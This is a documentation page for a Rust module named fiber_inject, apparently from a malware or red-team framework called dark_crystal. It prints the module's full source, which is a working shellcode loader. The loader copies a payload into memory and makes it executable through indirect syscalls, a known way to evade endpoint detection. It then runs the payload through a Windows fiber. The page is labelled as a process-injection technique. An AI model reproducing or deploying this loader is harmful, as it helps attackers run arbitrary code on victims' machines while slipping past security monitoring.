# fiber_inject

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/fiber_inject.rs` |
| **Lines** | 57 |
| **Cards** | T007-process-injection |
| **Role** | Fiber injection (experimental) |
| **Unsafe blocks** | 2 |

## Constants

- `ERROR_ALREADY_FIBER`: `u32` = `0x80`

## Public API

### `try_fiber_inject` (line 10)
```rust
pub fn try_fiber_inject(shellcode: &[u8]) -> bool
```

## Internal Functions

- `exec_fiber` (line 51)

## Key Dependencies

- `use windows_sys::Win32::Foundation::GetLastError;`
- `use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;`
- `use windows_sys::Win32::System::Threading::{`

## Full Source

```rust
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
use windows_sys::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
};

const ERROR_ALREADY_FIBER: u32 = 0x80;

pub fn try_fiber_inject(shellcode: &[u8]) -> bool {
    unsafe {
        let main_fiber = ConvertThreadToFiber(null_mut());
        if main_fiber.is_null() {
            let err = GetLastError();
            if err != ERROR_ALREADY_FIBER {
                return false;
            }
        }

        let mut buf = Vec::from(shellcode);

        let entry = CreateFiber(0, Some(exec_fiber), buf.as_mut_ptr() as *mut _);
        if entry.is_null() {
            return false;
        }

        // Cambiar protecciones a RX (PAGE_EXECUTE_READ) via sys_indirect
        let mut old_protect = 0u32;
        let mut base_addr = buf.as_mut_ptr() as usize;
        let mut region_size = buf.len();

        let status = crate::sys_indirect::nt::nt_protect_virtual_memory(
            -1isize as usize, // CurrentProcess
            &mut base_addr as *mut _ as *mut *mut core::ffi::c_void,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status != 0 {
            // Error protecting memory
            return false;
        }

        SwitchToFiber(entry);
        DeleteFiber(entry);
        true
    }
}

extern "system" fn exec_fiber(param: *mut core::ffi::c_void) {
    let sc = param as *const u8;
    unsafe {
        let f: extern "system" fn() = std::mem::transmute(sc);
        f();
    }
}

```